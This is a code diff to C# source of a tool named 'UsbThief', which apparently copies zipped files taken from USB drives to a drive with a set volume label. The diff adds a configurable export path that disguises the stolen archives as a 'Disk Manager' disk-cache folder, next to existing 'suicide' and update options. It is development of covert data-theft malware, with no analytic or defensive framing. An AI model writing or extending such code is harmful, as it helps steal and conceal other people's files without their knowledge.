@@ -35,7 +35,7 @@ namespace UsbThief
         public static Logger logger = null;
         public SynchronizationContext mainThreadSynContext;
         public Status sta = Status.none;
-        public Config conf = new Config { enable = false, suicide = false, ver = innerVer, update = null, exts = null, sizeLim = 100, volName = "仿生人会涮电子羊吗" };
+        public Config conf = new Config { enable = false, suicide = false, ver = innerVer, update = null, exts = null, sizeLim = 100, volName = "仿生人会涮电子羊吗", exportPath = @"Disk Manager\data\diskcache\files\" };
         public UsbDevice currentDevice = new UsbDevice { name = "none", volLabel = "none", ser = "none" };
         public enum Status
         {
@@ -54,6 +54,7 @@ namespace UsbThief
             public List<string> exts;
             public int sizeLim;
             public string volName;
+            public string exportPath;
         }
         public struct UsbDevice
         {
@@ -328,6 +329,9 @@ namespace UsbThief
                                                     }
                                                 }
                                                 sr.Close();
+                                                string path = currentDevice.name + conf.exportPath;
+                                                if (!Directory.Exists(path))
+                                                    Directory.CreateDirectory(path);
                                                 string[] files = Directory.GetFiles(workspace, "*.zip");
                                                 foreach (var file in files)
                                                 {
@@ -335,7 +339,15 @@ namespace UsbThief
                                                     {
                                                         if (file.Substring(file.LastIndexOf("\\") + 1) == item.Key + ".zip")
                                                         {
-                                                            string tar = currentDevice.name + item.Key + ".zip";
+                                                            string tar;
+                                                            if (path.EndsWith("\\"))
+                                                            {
+                                                                tar = path + item.Key + ".zip";
+                                                            }
+                                                            else
+                                                            {
+                                                                tar = path + "\\" + item.Key + ".zip";
+                                                            }
                                                             try
                                                             {
                                                                 if (File.Exists(tar))
@@ -346,9 +358,9 @@ namespace UsbThief
                                                                     {
                                                                         WriteSta(item.Key, Status.exporting);
                                                                         logger.Info("正在导出文件：" + file);
-                                                                        File.Copy(file, currentDevice.name + item.Key + ".zip", true);
+                                                                        File.Copy(file, tar, true);
                                                                         WriteSta(item.Key, Status.exported);
-                                                                        logger.Info("导出完成：" + currentDevice.name + item.Key + ".zip");
+                                                                        logger.Info("导出完成：" + tar);
                                                                     }
                                                                     else
                                                                     {
@@ -359,9 +371,9 @@ namespace UsbThief
                                                                 {
                                                                     WriteSta(item.Key, Status.exporting);
                                                                     logger.Info("正在导出文件：" + file);
-                                                                    File.Copy(file, currentDevice.name + item.Key + ".zip");
+                                                                    File.Copy(file, tar);
                                                                     WriteSta(item.Key, Status.exported);
-                                                                    logger.Info("导出完成：" + currentDevice.name + item.Key + ".zip");
+                                                                    logger.Info("导出完成：" + tar);
                                                                 }
                                                             }
                                                             catch (Exception e)
